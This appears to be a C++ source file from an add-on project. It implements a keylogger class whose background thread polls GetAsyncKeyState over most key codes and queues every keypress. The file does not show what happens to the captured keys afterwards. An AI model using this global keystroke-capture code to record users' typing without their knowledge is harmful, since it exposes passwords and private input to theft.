#pragma once

#include "keylog.h"



extern addonThread* gThread;
extern addonMutex* gMutex;
extern addonKeylog* gKeylog;


std::queue<int> keyQueue;





addonKeylog::addonKeylog()
{
	addonDebug("Keylog constructor called");

	this->active = true;

	this->keylogHandle = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread);
}



addonKeylog::~addonKeylog()
{
	addonDebug("Keylog deconstructor called");

	this->active = false;

	gThread->Stop(this->keylogHandle);
}



DWORD _stdcall keylog_thread(LPVOID lpParam)
{
	addonDebug("Thread 'keylog_thread' successfuly started");

	while(gKeylog->active)
	{
		for(int q = 8; q != 191; q++)
		{
			if(GetAsyncKeyState(q) == -32767)
			{
				gMutex->Lock(gMutex->mutexHandle);
				keyQueue.push(q);
				gMutex->unLock(gMutex->mutexHandle);
			}
		}

		Sleep(1);
	}

	return 1;
}